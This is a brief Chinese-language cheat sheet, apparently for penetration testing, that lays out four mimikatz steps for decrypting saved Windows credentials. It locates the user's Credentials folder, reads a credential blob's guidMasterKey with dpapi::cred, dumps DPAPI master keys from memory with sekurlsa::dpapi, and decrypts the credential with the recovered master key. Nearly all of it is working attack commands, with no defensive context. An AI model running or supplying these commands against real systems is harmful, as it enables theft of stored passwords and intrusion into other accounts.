## 1. windows 凭证目录

```
%userprofile%\AppData\Local\Microsoft\Credentials\*
```

## 2. 获取 `guidMasterKey` 格式为：{xxxxxx-d114-4851-b9ab-xxxxxxxxxxx}

```
mimikatz # dpapi::cred /in:%userprofile%\AppData\Local\Microsoft\Credentials\XXXXXXXXXXXXXXXXXX
```

## 3. 通过 `guidMasterKey` 找到 `MasterKey`

```
mimikatz # sekurlsa::dpapi
```

## 4. 获取凭证

```
mimikatz dpapi::cred /in:%userprofile%\AppData\Local\Microsoft\Credentials\XXXXXXXXXXXXXXXXXX /masterkey:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```
